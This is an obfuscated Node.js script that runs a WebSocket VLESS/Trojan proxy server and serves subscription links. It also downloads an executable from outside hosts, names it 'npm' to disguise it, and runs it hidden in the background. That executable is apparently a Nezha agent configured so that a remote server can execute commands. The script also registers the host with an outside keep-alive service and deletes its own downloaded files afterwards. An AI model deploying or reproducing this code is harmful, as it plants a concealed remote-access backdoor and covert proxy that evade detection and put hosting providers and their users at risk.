const _0x460870=_0x2684;(function(_0x354ad8,_0x3430e9){const _0x2aa572=_0x2684,_0x13cfb9=_0x354ad8();while(!![]){try{const _0x256b60=parseInt(_0x2aa572(0xea))/0x1*(-parseInt(_0x2aa572(0xca))/0x2)+parseInt(_0x2aa572(0xdb))/0x3*(-parseInt(_0x2aa572(0xfa))/0x4)+-parseInt(_0x2aa572(0xa8))/0x5*(parseInt(_0x2aa572(0x11b))/0x6)+parseInt(_0x2aa572(0xcb))/0x7+parseInt(_0x2aa572(0x108))/0x8+parseInt(_0x2aa572(0xcc))/0x9*(-parseInt(_0x2aa572(0xb7))/0xa)+-parseInt(_0x2aa572(0x10f))/0xb*(-parseInt(_0x2aa572(0xc9))/0xc);if(_0x256b60===_0x3430e9)break;else _0x13cfb9['push'](_0x13cfb9['shift']());}catch(_0x1f492e){_0x13cfb9['push'](_0x13cfb9['shift']());}}}(_0x4364,0x8bf86));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x460870(0xf4)),net=require(_0x460870(0x11f)),path=require('path'),crypto=require(_0x460870(0x101)),{Buffer}=require(_0x460870(0xc8)),{exec,execSync}=require(_0x460870(0x11e)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x460870(0xf6)][_0x460870(0x120)]||'10e55c36-5562-4429-abe5-cfedcb9416bb',NEZHA_SERVER=process[_0x460870(0xf6)][_0x460870(0x103)]||'',NEZHA_PORT=process['env'][_0x460870(0x121)]||'',NEZHA_KEY=process[_0x460870(0xf6)][_0x460870(0xa5)]||'',DOMAIN=process[_0x460870(0xf6)][_0x460870(0xee)]||_0x460870(0x117),AUTO_ACCESS=process[_0x460870(0xf6)][_0x460870(0xf3)]||!![],WSPATH=process[_0x460870(0xf6)][_0x460870(0xed)]||UUID[_0x460870(0xba)](0x0,0x8),SUB_PATH=process[_0x460870(0xf6)]['SUB_PATH']||_0x460870(0xa4),NAME=process[_0x460870(0xf6)][_0x460870(0xc0)]||'',PORT=process['env'][_0x460870(0x107)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x20cd6b=_0x460870;try{const _0x1d5fad=await axios[_0x20cd6b(0xfd)](_0x20cd6b(0x116)),_0x17a08e=_0x1d5fad[_0x20cd6b(0xe3)];ISP=(_0x17a08e[_0x20cd6b(0x10c)]+'-'+_0x17a08e['isp'])[_0x20cd6b(0x104)](/ /g,'_');}catch(_0x1c1eb7){ISP=_0x20cd6b(0xb6);}};GetISP();const httpServer=http[_0x460870(0x118)]((_0x1a65f,_0x23d23e)=>{const _0x245165=_0x460870;if(_0x1a65f['url']==='/'){const _0x2950b4=path[_0x245165(0xa0)](__dirname,_0x245165(0xdc));fs[_0x245165(0xe4)](_0x2950b4,_0x245165(0xec),(_0x3b752f,_0x4390f0)=>{const _0x2e5a43=_0x245165;if(_0x3b752f){_0x23d23e[_0x2e5a43(0xa9)](0xc8,{'Content-Type':_0x2e5a43(0x100)}),_0x23d23e['end'](_0x2e5a43(0xdf));return;}_0x23d23e[_0x2e5a43(0xa9)](0xc8,{'Content-Type':_0x2e5a43(0x100)}),_0x23d23e[_0x2e5a43(0x10a)](_0x4390f0);});return;}else{if(_0x1a65f[_0x245165(0xf8)]==='/'+SUB_PATH){const _0x39b2cf=NAME?NAME+'-'+ISP:ISP,_0xc84fe5=_0x245165(0xef)+UUID+'@'+DOMAIN+_0x245165(0xcd)+DOMAIN+_0x245165(0xaf)+DOMAIN+_0x245165(0xa2)+WSPATH+'#'+_0x39b2cf,_0x2a8e65=_0x245165(0x11a)+UUID+'@'+DOMAIN+_0x245165(0xe8)+DOMAIN+_0x245165(0xaf)+DOMAIN+_0x245165(0xa2)+WSPATH+'#'+_0x39b2cf,_0x53450e=_0xc84fe5+'\x0a'+_0x2a8e65,_0x1afc40=Buffer[_0x245165(0xd1)](_0x53450e)['toString'](_0x245165(0xf7));_0x23d23e[_0x245165(0xa9)](0xc8,{'Content-Type':_0x245165(0xce)}),_0x23d23e[_0x245165(0x10a)](_0x1afc40+'\x0a');}else _0x23d23e[_0x245165(0xa9)](0x194,{'Content-Type':_0x245165(0xce)}),_0x23d23e[_0x245165(0x10a)](_0x245165(0xeb));}}),wss=new WebSocket[(_0x460870(0xff))]({'server':httpServer}),uuid=UUID[_0x460870(0x104)](/-/g,''),DNS_SERVERS=[_0x460870(0xc7),'1.1.1.1'];function resolveHost(_0x14cd90){return new Promise((_0x4c206c,_0x6f47f7)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x14cd90)){_0x4c206c(_0x14cd90);return;}let _0x3c6ac1=0x0;function _0x1adf29(){const _0x48cb0f=_0x2684;if(_0x3c6ac1>=DNS_SERVERS[_0x48cb0f(0xe6)]){_0x6f47f7(new Error(_0x48cb0f(0x10d)+_0x14cd90+_0x48cb0f(0xc6)));return;}const _0x28daa2=DNS_SERVERS[_0x3c6ac1];_0x3c6ac1++;const _0x10b69d=_0x48cb0f(0xe0)+encodeURIComponent(_0x14cd90)+_0x48cb0f(0xde);axios[_0x48cb0f(0xfd)](_0x10b69d,{'timeout':0x1388,'headers':{'Accept':_0x48cb0f(0x109)}})[_0x48cb0f(0x114)](_0x1d88a0=>{const _0x138db5=_0x48cb0f,_0x5a0a70=_0x1d88a0['data'];if(_0x5a0a70[_0x138db5(0xc4)]===0x0&&_0x5a0a70['Answer']&&_0x5a0a70[_0x138db5(0xd3)][_0x138db5(0xe6)]>0x0){const _0x51dcd2=_0x5a0a70[_0x138db5(0xd3)][_0x138db5(0xb1)](_0x244444=>_0x244444[_0x138db5(0xd5)]===0x1);if(_0x51dcd2){_0x4c206c(_0x51dcd2[_0x138db5(0xe3)]);return;}}_0x1adf29();})['catch'](_0x44753f=>{_0x1adf29();});}_0x1adf29();});}function handleVlessConnection(_0x4c8d36,_0xb5a6eb){const _0x33ab50=_0x460870,[_0x4502c1]=_0xb5a6eb,_0xa8229e=_0xb5a6eb[_0x33ab50(0xba)](0x1,0x11);if(!_0xa8229e[_0x33ab50(0xb2)]((_0x3b3b7f,_0x1d303f)=>_0x3b3b7f==parseInt(uuid[_0x33ab50(0xaa)](_0x1d303f*0x2,0x2),0x10)))return![];let _0x291991=_0xb5a6eb[_0x33ab50(0xba)](0x11,0x12)[_0x33ab50(0xfc)]()+0x13;const _0x3c04e3=_0xb5a6eb[_0x33ab50(0xba)](_0x291991,_0x291991+=0x2)[_0x33ab50(0xb0)](0x0),_0x5296cf=_0xb5a6eb[_0x33ab50(0xba)](_0x291991,_0x291991+=0x1)[_0x33ab50(0xfc)](),_0x341183=_0x5296cf==0x1?_0xb5a6eb['slice'](_0x291991,_0x291991+=0x4)[_0x33ab50(0xa0)]('.'):_0x5296cf==0x2?new TextDecoder()[_0x33ab50(0xb5)](_0xb5a6eb[_0x33ab50(0xba)](_0x291991+0x1,_0x291991+=0x1+_0xb5a6eb[_0x33ab50(0xba)](_0x291991,_0x291991+0x1)[_0x33ab50(0xfc)]())):_0x5296cf==0x3?_0xb5a6eb[_0x33ab50(0xba)](_0x291991,_0x291991+=0x10)[_0x33ab50(0xbe)]((_0x3e6ec9,_0x2223ff,_0x6917c8,_0x1bb398)=>_0x6917c8%0x2?_0x3e6ec9[_0x33ab50(0xe9)](_0x1bb398[_0x33ab50(0xba)](_0x6917c8-0x1,_0x6917c8+0x1)):_0x3e6ec9,[])[_0x33ab50(0x110)](_0x57fa6a=>_0x57fa6a[_0x33ab50(0xb0)](0x0)[_0x33ab50(0xb8)](0x10))[_0x33ab50(0xa0)](':'):'';_0x4c8d36[_0x33ab50(0xe5)](new Uint8Array([_0x4502c1,0x0]));const _0x151bf1=createWebSocketStream(_0x4c8d36);return resolveHost(_0x341183)[_0x33ab50(0x114)](_0x2533a8=>{const _0x54667a=_0x33ab50;net[_0x54667a(0xb4)]({'host':_0x2533a8,'port':_0x3c04e3},function(){const _0x5dec0e=_0x54667a;this[_0x5dec0e(0x106)](_0xb5a6eb['slice'](_0x291991)),_0x151bf1['on'](_0x5dec0e(0xda),()=>{})[_0x5dec0e(0xbf)](this)['on'](_0x5dec0e(0xda),()=>{})[_0x5dec0e(0xbf)](_0x151bf1);})['on']('error',()=>{});})[_0x33ab50(0xe1)](_0x461327=>{const _0x3975a1=_0x33ab50;net[_0x3975a1(0xb4)]({'host':_0x341183,'port':_0x3c04e3},function(){const _0x5e4fa2=_0x3975a1;this[_0x5e4fa2(0x106)](_0xb5a6eb[_0x5e4fa2(0xba)](_0x291991)),_0x151bf1['on'](_0x5e4fa2(0xda),()=>{})[_0x5e4fa2(0xbf)](this)['on']('error',()=>{})['pipe'](_0x151bf1);})['on'](_0x3975a1(0xda),()=>{});}),!![];}function handleTrojanConnection(_0x5fcc0d,_0x32be56){const _0xb3147d=_0x460870;try{if(_0x32be56[_0xb3147d(0xe6)]<0x3a)return![];const _0x4d96a0=_0x32be56[_0xb3147d(0xba)](0x0,0x38)['toString'](),_0x17b301=[UUID];let _0x4629aa=null;for(const _0xa38e21 of _0x17b301){const _0x29851c=crypto[_0xb3147d(0xf2)](_0xb3147d(0xd4))[_0xb3147d(0xbb)](_0xa38e21)[_0xb3147d(0x11d)](_0xb3147d(0xc5));if(_0x29851c===_0x4d96a0){_0x4629aa=_0xa38e21;break;}}if(!_0x4629aa)return![];let _0x1a2689=0x38;_0x32be56[_0x1a2689]===0xd&&_0x32be56[_0x1a2689+0x1]===0xa&&(_0x1a2689+=0x2);const _0x2947e8=_0x32be56[_0x1a2689];if(_0x2947e8!==0x1)return![];_0x1a2689+=0x1;const _0x31b82e=_0x32be56[_0x1a2689];_0x1a2689+=0x1;let _0x37fc71,_0x167cae;if(_0x31b82e===0x1)_0x37fc71=_0x32be56['slice'](_0x1a2689,_0x1a2689+0x4)['join']('.'),_0x1a2689+=0x4;else{if(_0x31b82e===0x3){const _0x2d6665=_0x32be56[_0x1a2689];_0x1a2689+=0x1,_0x37fc71=_0x32be56[_0xb3147d(0xba)](_0x1a2689,_0x1a2689+_0x2d6665)[_0xb3147d(0xb8)](),_0x1a2689+=_0x2d6665;}else{if(_0x31b82e===0x4)_0x37fc71=_0x32be56[_0xb3147d(0xba)](_0x1a2689,_0x1a2689+0x10)['reduce']((_0x44f336,_0x33f5ac,_0x67943b,_0x56e140)=>_0x67943b%0x2?_0x44f336[_0xb3147d(0xe9)](_0x56e140[_0xb3147d(0xba)](_0x67943b-0x1,_0x67943b+0x1)):_0x44f336,[])[_0xb3147d(0x110)](_0x2b5394=>_0x2b5394[_0xb3147d(0xb0)](0x0)['toString'](0x10))[_0xb3147d(0xa0)](':'),_0x1a2689+=0x10;else return![];}}_0x167cae=_0x32be56[_0xb3147d(0xb0)](_0x1a2689),_0x1a2689+=0x2;_0x1a2689<_0x32be56[_0xb3147d(0xe6)]&&_0x32be56[_0x1a2689]===0xd&&_0x32be56[_0x1a2689+0x1]===0xa&&(_0x1a2689+=0x2);const _0x5461d1=createWebSocketStream(_0x5fcc0d);return resolveHost(_0x37fc71)[_0xb3147d(0x114)](_0x2d2d13=>{const _0x2231f8=_0xb3147d;net[_0x2231f8(0xb4)]({'host':_0x2d2d13,'port':_0x167cae},function(){const _0x257487=_0x2231f8;_0x1a2689<_0x32be56[_0x257487(0xe6)]&&this['write'](_0x32be56[_0x257487(0xba)](_0x1a2689)),_0x5461d1['on'](_0x257487(0xda),()=>{})[_0x257487(0xbf)](this)['on'](_0x257487(0xda),()=>{})['pipe'](_0x5461d1);})['on']('error',()=>{});})[_0xb3147d(0xe1)](_0x4d42b0=>{const _0x2a258c=_0xb3147d;net['connect']({'host':_0x37fc71,'port':_0x167cae},function(){const _0x3aa148=_0x2684;_0x1a2689<_0x32be56['length']&&this[_0x3aa148(0x106)](_0x32be56[_0x3aa148(0xba)](_0x1a2689)),_0x5461d1['on'](_0x3aa148(0xda),()=>{})[_0x3aa148(0xbf)](this)['on'](_0x3aa148(0xda),()=>{})[_0x3aa148(0xbf)](_0x5461d1);})['on'](_0x2a258c(0xda),()=>{});}),!![];}catch(_0x476a0f){return![];}}wss['on']('connection',(_0x5c4f23,_0x594260)=>{const _0x3f24a8=_0x460870,_0x30233a=_0x594260[_0x3f24a8(0xf8)]||'';_0x5c4f23[_0x3f24a8(0x11c)](_0x3f24a8(0x102),_0x473ada=>{const _0x2dfa90=_0x3f24a8;if(_0x473ada[_0x2dfa90(0xe6)]>0x11&&_0x473ada[0x0]===0x0){const _0x9fe3ba=_0x473ada[_0x2dfa90(0xba)](0x1,0x11),_0x196990=_0x9fe3ba[_0x2dfa90(0xb2)]((_0x27d4a6,_0x1350d2)=>_0x27d4a6==parseInt(uuid[_0x2dfa90(0xaa)](_0x1350d2*0x2,0x2),0x10));if(_0x196990){!handleVlessConnection(_0x5c4f23,_0x473ada)&&_0x5c4f23[_0x2dfa90(0xa3)]();return;}}!handleTrojanConnection(_0x5c4f23,_0x473ada)&&_0x5c4f23[_0x2dfa90(0xa3)]();})['on'](_0x3f24a8(0xda),()=>{});});const getDownloadUrl=()=>{const _0x50c4a9=_0x460870,_0x1e2695=os[_0x50c4a9(0xf5)]();return _0x1e2695==='arm'||_0x1e2695==='arm64'||_0x1e2695===_0x50c4a9(0x105)?!NEZHA_PORT?_0x50c4a9(0xb3):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x50c4a9(0xb9):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x337a83=_0x460870;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x267e66=getDownloadUrl(),_0x68936a=await axios({'method':_0x337a83(0xfd),'url':_0x267e66,'responseType':_0x337a83(0xcf)}),_0x348ee6=fs[_0x337a83(0xd8)](_0x337a83(0xd6));return _0x68936a['data'][_0x337a83(0xbf)](_0x348ee6),new Promise((_0x888cb0,_0x27cec1)=>{const _0x36075f=_0x337a83;_0x348ee6['on']('finish',()=>{const _0x832fda=_0x2684;console[_0x832fda(0x113)]('npm\x20download\x20successfully'),exec(_0x832fda(0xd7),_0x49d4ce=>{if(_0x49d4ce)_0x27cec1(_0x49d4ce);_0x888cb0();});}),_0x348ee6['on'](_0x36075f(0xda),_0x27cec1);});}catch(_0x300978){throw _0x300978;}},runnz=async()=>{const _0x138828=_0x460870;try{const _0xe4d24b=execSync(_0x138828(0xe2),{'encoding':'utf-8'});if(_0xe4d24b[_0x138828(0x10e)]()!==''){console['log'](_0x138828(0xf0));return;}}catch(_0x4e5b0b){}await downloadFile();let _0x1e5a6a='',_0x3bb9d4=[_0x138828(0xfb),_0x138828(0xa7),'2096',_0x138828(0xa6),_0x138828(0x122),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5cce7e=_0x3bb9d4[_0x138828(0xf9)](NEZHA_PORT)?_0x138828(0xfe):'';_0x1e5a6a=_0x138828(0xc1)+NEZHA_SERVER+':'+NEZHA_PORT+_0x138828(0xf1)+NEZHA_KEY+'\x20'+_0x5cce7e+_0x138828(0xd9);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5b6a0c=NEZHA_SERVER[_0x138828(0xf9)](':')?NEZHA_SERVER['split'](':')[_0x138828(0xae)]():'',_0x225bcd=_0x3bb9d4['includes'](_0x5b6a0c)?_0x138828(0xa1):_0x138828(0xad),_0x186198=_0x138828(0xbd)+NEZHA_KEY+_0x138828(0xac)+NEZHA_SERVER+_0x138828(0xab)+_0x225bcd+_0x138828(0xc3)+UUID;fs['writeFileSync'](_0x138828(0xc2),_0x186198);}_0x1e5a6a=_0x138828(0x112);}else{console[_0x138828(0x113)](_0x138828(0x119));return;}}try{exec(_0x1e5a6a,{'shell':'/bin/bash'},_0x4392cc=>{const _0x8b001e=_0x138828;if(_0x4392cc)console[_0x8b001e(0xda)](_0x8b001e(0xe7),_0x4392cc);else console[_0x8b001e(0x113)](_0x8b001e(0x123));});}catch(_0x2539c8){console[_0x138828(0xda)](_0x138828(0x10b)+_0x2539c8);}};async function addAccessTask(){const _0x2d4454=_0x460870;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x315699=_0x2d4454(0x115)+DOMAIN;try{const _0x571e81=await axios[_0x2d4454(0x111)](_0x2d4454(0xdd),{'url':_0x315699},{'headers':{'Content-Type':_0x2d4454(0xbc)}});console[_0x2d4454(0x113)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x5f5858){}}const delFiles=()=>{const _0x518f39=_0x460870;fs[_0x518f39(0xd2)](_0x518f39(0xd6),()=>{}),fs['unlink'](_0x518f39(0xc2),()=>{});};httpServer[_0x460870(0xd0)](PORT,()=>{const _0x536480=_0x460870;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x536480(0x113)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});function _0x2684(_0x26a62b,_0x2d8e67){_0x26a62b=_0x26a62b-0xa0;const _0x4364bb=_0x4364();let _0x2684ed=_0x4364bb[_0x26a62b];return _0x2684ed;}function _0x4364(){const _0x30696b=['find','every','https://arm64.ssss.nyc.mn/v1','connect','decode','Unknown','31760YwtQOu','toString','https://amd64.ssss.nyc.mn/v1','slice','update','application/json','client_secret:\x20','reduce','pipe','NAME','setsid\x20nohup\x20./npm\x20-s\x20','config.yaml','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Status','hex','\x20with\x20all\x20DNS\x20servers','8.8.4.4','buffer','12wTdyrF','58TeXWRj','2143050ZSuaEI','684nagzVA',':443?encryption=none&security=tls&sni=','text/plain','stream','listen','from','unlink','Answer','sha224','type','npm','chmod\x20+x\x20npm','createWriteStream','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','error','125526IEnfCi','index.html','https://oooo.serv00.net/add-url','&type=A','Hello\x20world!','https://dns.google/resolve?name=','catch','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','data','readFile','send','length','npm\x20running\x20error:',':443?security=tls&sni=','concat','5277FuYlMj','Not\x20Found\x0a','utf8','WSPATH','DOMAIN','vless://','npm\x20is\x20already\x20running,\x20skip\x20running...','\x20-p\x20','createHash','AUTO_ACCESS','axios','arch','env','base64','url','includes','48cOlgoY','443','readUInt8','get','--tls','Server','text/html','crypto','message','NEZHA_SERVER','replace','aarch64','write','PORT','1083064JCvRZQ','application/dns-json','end','error:\x20','country_code','Failed\x20to\x20resolve\x20','trim','22170566LDpmNN','map','post','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','log','then','https://','https://api.ip.sb/geoip','1234.abc.com','createServer','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','trojan://','12cbVuqy','once','digest','child_process','net','UUID','NEZHA_PORT','2083','npm\x20is\x20running','join','true','&path=%2F','close','sub','NEZHA_KEY','2087','8443','2468020MYRItj','writeHead','substr','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','false','pop','&fp=chrome&type=ws&host=','readUInt16BE'];_0x4364=function(){return _0x30696b;};return _0x4364();}
